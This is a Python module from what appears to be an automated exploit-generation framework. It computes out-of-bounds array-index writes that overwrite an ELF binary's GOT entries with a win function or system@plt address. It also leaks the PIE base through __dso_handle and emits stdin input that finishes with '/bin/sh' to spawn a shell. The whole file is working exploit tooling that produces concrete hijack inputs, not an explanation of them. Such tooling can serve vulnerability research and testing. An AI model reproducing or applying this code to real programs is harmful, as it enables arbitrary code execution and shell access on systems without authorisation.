"""Static CWE-129 out-of-bounds INDEX-write recipe: the exact index + value pair, no execution.

An unchecked `arr[idx] = value` is a write-what-where whose WHERE is chosen by the index:
`&arr[idx] == base + idx*stride`. Every term is a fact of the image -- the array base and element
stride (symbol table / scaled-index disassembly), the GOT slot addresses (.rela.plt), the win
function (symbols / call graph), `system@plt` (the PLT stub bytes) -- so the index that lands on a
GOT slot is ARITHMETIC, not a search:

    idx = (slot - base) / stride                  (exact when the difference is stride-aligned)

and the value is the win / system@plt address. `chain_primitive` already performs this search LIVE
(`_oob_write_hijack`) and confirms it under ptrace; when the target cannot run (air-gap, foreign CPU,
missing libraries) the old fallback was a sentence ("write a chosen value through the out-of-bounds
slot; aim it at a saved return / GOT entry"). This module emits the numbers instead.

PIE note (why this is still useful on a PIE target): the array and the GOT live in the SAME image, so
`slot - base` -- and therefore the index -- is ASLR-INVARIANT. Only the VALUE needs the image base, and
the same unchecked index usually READS too: reading `__dso_handle` (a .data word that holds its own
address) through the array discloses the base. The recipe states both indices.

Consumed evidence schema (what a CWE-129 finding may carry for this module to use; every field is
optional and the module falls back to the statically recovered arrays):
  * an evidence entry with channel "array-index" whose `detail` is a JSON object
        {"array": "<symbol>", "base": "0x<vaddr>", "stride": <int>, "cap": <int>,
         "access": "write"|"read"}
    or, in ANY evidence detail, `key=value` tokens: `array=<sym> base=0x<vaddr> stride=<n> cap=<n>
    access=write|read`;
  * the existing `oob_index` detail text "<name>[<cap>] (stride <n>B)" / "on <name>[<cap>]".

Honesty: filed through `recipe.file_recipe` (`corroborated`, never a verified PoC), the index-
parsing assumption (signed vs unsigned read) and the bound-check assumption stated."""
from __future__ import annotations

import json
import logging
import re
from typing import Optional

from ... import observe
from . import elfstatic

_log = logging.getLogger(__name__)

#: GOT targets in preference order when the value is a WIN: functions a menu loop calls again right
#: after the write, so the hijack fires with no further input.
_HOT = ("printf", "puts", "putchar", "fflush", "fwrite", "fputs", "__printf_chk", "write",
        "read", "fgets", "scanf", "__isoc99_scanf", "strtol", "atoi", "exit")
#: GOT targets whose FIRST argument is attacker text, for a value of system@plt: the next call
#: becomes system(<your input>). Ordered by how commonly a menu feeds raw input to them.
_STRARG = ("atoi", "atol", "atoll", "strtol", "strtoul", "strtoll", "strtoull", "puts", "strlen",
           "free")
_NOT_TARGET = {"__stack_chk_fail", "abort", "__assert_fail", "_exit", "__libc_start_main",
               "__cxa_finalize", "__gmon_start__"}
_MAX_INDEX = 1 << 24


def _parse_int(v) -> Optional[int]:
    try:
        return int(v, 0) if isinstance(v, str) else int(v)
    except (TypeError, ValueError):
        return None


def arrays_from_lead(lead, target_bytes: bytes) -> list:
    """The array(s) a CWE-129 finding names, resolved against the image. [] when it names none."""
    from . import exploit
    hints = []
    for e in (getattr(lead, "evidence", None) or []):
        # The `array_index` detector (detect/detectors.py) carries a structured dict on its
        # evidence entry: {"array": {"kind","name","addr","size","elements","element_size"},
        # "access", "oob_index": [...]}. Consume it directly (globals only -- a stack array has no
        # absolute address to turn an index into a GOT slot; that path stays leak-gated).
        ai = e.get("array_index")
        if isinstance(ai, dict) and isinstance(ai.get("array"), dict):
            a = ai["array"]
            if a.get("kind") == "global" and a.get("addr"):
                hints.append({"array": a.get("name"), "base": a.get("addr"),
                              "stride": a.get("element_size"), "cap": a.get("elements"),
                              "access": ai.get("access") or "write"})
                continue
        d = str(e.get("detail", "") or "")
        if e.get("channel") == "array-index":
            try:
                j = json.loads(d)
                if isinstance(j, dict):
                    hints.append(j)
                    continue
            except ValueError:
                pass
        kv = dict(re.findall(r"\b(array|base|stride|cap|access)=([\w.$@]+)", d))
        if kv:
            hints.append(kv)
        for m in re.finditer(r"(?:array|on)\s+([A-Za-z_][\w.$]*)\[(\d+)\](?:\s*\(stride\s+(\d+)B\))?",
                             d):
            hints.append({"array": m.group(1), "cap": m.group(2), "stride": m.group(3)})
    try:
        objs = exploit.elf_objects_sized(target_bytes)
    except Exception:                                    # noqa: BLE001
        objs = {}
    out, seen = [], set()
    for h in hints:
        name = h.get("array")
        base = _parse_int(h.get("base"))
        size = None
        if base is None and name:
            if name in objs:
                base, size = objs[name]
            else:
                m = re.match(r"data_([0-9a-fA-F]+)$", name)
                base = int(m.group(1), 16) if m else None
        if base is None:
            continue
        stride = _parse_int(h.get("stride")) or 8
        cap = _parse_int(h.get("cap")) or ((size // stride) if size and stride else None)
        if base in seen:
            continue
        seen.add(base)
        out.append({"name": name or f"data_{base:x}", "addr": base, "stride": stride,
                    "cap": cap or 0, "access": h.get("access") or "write"})
    return out


def _chunks(value: int, stride: int, nbytes: int = 6):
    """Split a pointer into the per-element writes an array of `stride`-byte cells needs to cover
    `nbytes` bytes of the destination (a resolved GOT slot's high bytes must be cleared too)."""
    if stride >= 8:
        return [value & 0xFFFFFFFFFFFFFFFF]
    n = (nbytes + stride - 1) // stride
    mask = (1 << (8 * stride)) - 1
    return [(value >> (8 * stride * i)) & mask for i in range(n)]


def _signed(v: int, stride: int) -> int:
    """The element value as the program would print/parse it (two's complement of the cell)."""
    bits = 8 * min(stride, 8)
    v &= (1 << bits) - 1
    return v - (1 << bits) if v >> (bits - 1) else v


def plan_index_write(target_bytes: bytes, arr: dict, *, win=None) -> list:
    """Concrete write plans for one array: [{target, slot, index, writes:[(idx, value)], value_desc,
    followup, target_level, notes}], best first. [] when no fixed target is addressable."""
    from . import rop
    try:
        got = rop.got_entries(target_bytes)
    except Exception:                                    # noqa: BLE001
        got = {}
    try:
        bind_now = rop.has_bind_now(target_bytes)
    except Exception:                                    # noqa: BLE001
        bind_now = False
    pie = elfstatic.is_pie(target_bytes)
    plt = elfstatic.plt_stubs(target_bytes)
    win_calls = elfstatic.plt_callees(target_bytes, int(win[1])) if win and win[1] else set()
    base, stride = int(arr["addr"]), int(arr.get("stride") or 8)
    if stride <= 0:
        return []
    plans = []

    def _index(slot):
        d = slot - base
        if d % stride:
            return None
        i = d // stride
        return i if abs(i) <= _MAX_INDEX and not (0 <= i < (arr.get("cap") or 0)) else None

    if got and not bind_now:
        cands = []
        if win and win[1]:
            names = sorted((n for n in got if n not in _NOT_TARGET and n not in win_calls),
                           key=lambda n: (_HOT.index(n) if n in _HOT else 99, n))
            for n in names:
                cands.append((n, int(win[1]), f"&{win[0]}", b""))
        if "system" in plt:
            for n in _STRARG:
                if n in got:
                    cands.append((n, plt["system"], "system@plt", b"/bin/sh\n"))
        for name, value, vdesc, follow in cands:
            i = _index(got[name])
            if i is None:
                continue
            chunks = _chunks(value, stride)
            writes = [(i + k, _signed(c, stride)) for k, c in enumerate(chunks)]
            notes = ["the index is used without a lower/upper bound check (CWE-129)",
                     "partial/no RELRO: the GOT is writable at run time",
                     f"{name}() is called after the write" + (" with attacker text as its first "
                                                              "argument" if follow else "")]
            if pie:
                notes.append("PIE: the INDEX is exact (array and GOT share the image, so their "
                             "distance is ASLR-invariant) but the VALUE is image-relative: add the "
                             "image base (see the disclosure index)")
            if len(writes) > 1:
                notes.append(f"{stride}-byte cells: the pointer is written as {len(writes)} "
                             "consecutive elements (high bytes cleared so a resolved libc pointer "
                             "is fully replaced)")
            plans.append({"target": f"{name}@GOT", "slot": got[name], "index": i,
                          "writes": writes, "value": value,
                          "value_desc": f"{vdesc} ({value:#x}{' + image base' if pie else ''})",
                          "followup": follow, "target_level": "L3", "notes": notes})
            if len(plans) >= 3:
                break
    # The disclosure index for a PIE base (the same unchecked index read through the array).
    if pie:
        try:
            from . import exploit
            dso = exploit.elf_objects(target_bytes).get("__dso_handle")
        except Exception:                                # noqa: BLE001
            dso = None
        if dso:
            i = _index(dso)
            if i is not None:
                for p in plans:
                    p["notes"].append(f"image base = (value read at index {i}, i.e. __dso_handle "
                                      f"which holds its own address) - {dso:#x}")
    return plans


def _index_forms(i: int) -> str:
    return (f"{i} (as unsigned 32-bit {i & 0xFFFFFFFF}, 64-bit {i & 0xFFFFFFFFFFFFFFFF})"
            if i < 0 else str(i))


def file_oob_index_recipe(ctx, target, lead, *, why: str, target_bytes: Optional[bytes] = None,
                          arrays: Optional[list] = None, seq_for=None) -> list:
    """Compute and file the CWE-129 index-write recipe(s) for `lead`. `arrays` overrides the arrays
    resolved from the lead's evidence; `seq_for(index, value) -> bytes` (optional, from a live menu
    crawl) builds the exact menu input for one write. Returns filed finding ids. Never raises."""
    from . import exploit, recipe
    fids = []
    try:
        if target_bytes is None:
            target_bytes = ctx.content.path(target.sha256).read_bytes()
        arrs = list(arrays or []) or (arrays_from_lead(lead, target_bytes) if lead else [])
        if not arrs:
            return []
        try:
            from ...db.dao import CallEdgeDAO
            edges = CallEdgeDAO(ctx.conn).list_by_target(target.id)
        except Exception:                                # noqa: BLE001
            edges = None
        win = exploit.find_win(exploit.elf_functions(target_bytes), call_edges=edges)
        win = win if win and win[0] else None
        cwe = getattr(lead, "cwe", None) or "CWE-129"
        for arr in arrs[:2]:
            plans = plan_index_write(target_bytes, arr, win=win)
            if not plans:
                continue
            best = plans[0]
            fields = b"".join(b"%d\n%d\n" % (i, v) for i, v in best["writes"])
            inp = None
            if seq_for is not None:
                try:
                    inp = b"".join(seq_for(i, v) for i, v in best["writes"])
                except Exception:                        # noqa: BLE001
                    inp = None
            exact = inp is not None
            inp = (inp if exact else fields) + best["followup"]
            writes_txt = "; ".join(f"{arr['name']}[{_index_forms(i)}] = {v}"
                                   for i, v in best["writes"])
            alts = [f"{p['target']} via index {p['index']}" for p in plans[1:]]
            summary = (f"unchecked index into {arr['name']} (base {arr['addr']:#x}, stride "
                       f"{arr['stride']}B): {writes_txt} overwrites {best['target']} "
                       f"({best['slot']:#x}) with {best['value_desc']}"
                       + (" -- then send '/bin/sh' so the hijacked call runs system(\"/bin/sh\")"
                          if best["followup"] else "")
                       + ("" if exact else " [input = the index/value fields in order; prefix the "
                          "menu selection that reaches the write]"))
            steps = [f"index = ({best['slot']:#x} - {arr['addr']:#x}) / {arr['stride']} = "
                     f"{best['index']}",
                     f"write {writes_txt}",
                     f"trigger: the program's next call to {best['target'].split('@')[0]}()"]
            if alts:
                steps.append("alternatives: " + ", ".join(alts))
            fid = recipe.file_recipe(
                ctx, target, cwe=cwe, technique=f"oob-index-write {best['target']}",
                target_level=best["target_level"], severity="high", detector="oob_recipe",
                dedup_key=f"recipe:{cwe}:oob-index-write:{arr['addr']:#x}:{target.id}",
                title=(f"Exploitation recipe: out-of-bounds index write {arr['name']}"
                       f"[{best['index']}] -> {best['target']}"),
                summary=summary, steps=steps, why_not_executed=why, lead=lead,
                extra_evidence=[{"channel": "recipe-assumptions",
                                 "detail": "; ".join(best["notes"])},
                                {"channel": "recipe-plan", "detail": json.dumps(
                                    {"array": arr["name"], "base": hex(arr["addr"]),
                                     "stride": arr["stride"], "target": best["target"],
                                     "slot": hex(best["slot"]),
                                     "writes": [[i, v] for i, v in best["writes"]]})}],
                input_bytes=inp, input_mode="stdin")
            if fid:
                fids.append(fid)
    except Exception:                                    # noqa: BLE001 -- advisory, never fatal
        observe.absorbed(_log, "oob-index recipe not filed")
    return fids
